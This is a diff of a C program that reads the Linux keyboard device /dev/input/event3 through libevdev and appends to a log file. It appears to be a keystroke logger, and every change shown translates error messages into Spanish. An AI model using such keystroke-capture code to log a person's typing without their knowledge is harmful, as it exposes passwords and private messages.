@@ -51,13 +51,13 @@ int main() {
     //abrir el dispositivo de entrada de teclado
     fd = open("/dev/input/event3", O_RDONLY); //reemplaza X con el número de tu dispositivo de teclado
     if (fd < 0) {
-        perror("Cannot open input device");
+        perror("No se puede abrir el dispositivo de input");
         exit(1);
     }
 
     file = fopen(PATH, "a+");
     if (file == NULL) {
-        perror("Cannot open log file");
+        perror("No se puede abrir el archivo de log");
         close(fd);
         exit(1);
     }
@@ -68,7 +68,7 @@ int main() {
 
     dev = libevdev_new();
     if (!dev) {
-        fprintf(stderr, "Cannot allocate libevdev structure\n");
+        fprintf(stderr, "No se puede asignar la estructura libevdev\n");
         close(fd);
         fclose(file);
         exit(1);
@@ -76,7 +76,7 @@ int main() {
 
     rc = libevdev_set_fd(dev, fd);
     if (rc < 0) {
-        fprintf(stderr, "Cannot set libevdev fd: %s\n", strerror(-rc));
+        fprintf(stderr, "No se puede configurar libevdev fd: %s\n", strerror(-rc));
         libevdev_free(dev);
         close(fd);
         fclose(file);
@@ -107,7 +107,7 @@ int main() {
                 }
             }
         } else if (rc != LIBEVDEV_READ_STATUS_SUCCESS && rc != -EAGAIN) {
-            fprintf(stderr, "Error reading event: %s\n", strerror(-rc));
+            fprintf(stderr, "Error de lectura: %s\n", strerror(-rc));
             break;
         }
     }
